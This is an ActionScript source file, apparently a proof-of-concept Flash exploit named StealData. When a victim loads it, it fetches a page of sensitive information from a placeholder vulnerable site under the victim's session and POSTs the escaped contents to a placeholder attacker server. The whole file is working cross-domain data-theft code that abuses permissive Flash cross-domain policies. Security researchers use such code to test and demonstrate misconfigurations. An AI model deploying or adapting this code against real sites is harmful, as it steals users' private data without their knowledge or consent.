// Author: Gursev Singh Kalra (gursev.kalra@foundstone.com)
// Very slightly modified by Seth Art (sethsec@gmail.com)
// StealData.as

package {
	import flash.display.Sprite;
	import flash.events.*;
	import flash.net.URLRequestMethod;
	import flash.net.URLRequest;
	import flash.net.URLLoader;

	public class StealData extends Sprite {
		public function StealData() {
			// Target URL from where the data is to be retrieved
			var readFrom:String = "https://<vulnerable-site>/<page-with-sensitive-info>";
			var readRequest:URLRequest = new URLRequest(readFrom);
			var getLoader:URLLoader = new URLLoader();
			getLoader.addEventListener(Event.COMPLETE, eventHandler);
			try {
				getLoader.load(readRequest);
			} catch (error:Error) {
				trace("Error loading URL: " + error);
			}
		}

		private function eventHandler(event:Event):void {
			// URL to which retrieved data is to be sent
			var sendTo:String = "https://<attackers-server>/"
			var sendRequest:URLRequest = new URLRequest(sendTo);
			sendRequest.method = URLRequestMethod.POST;
                        var body:String = escape(event.target.data);
			sendRequest.data = body;
			var sendLoader:URLLoader = new URLLoader();
			try {
				sendLoader.load(sendRequest);
			} catch (error:Error) {
				trace("Error loading URL: " + error);
			}
		}
	}
}
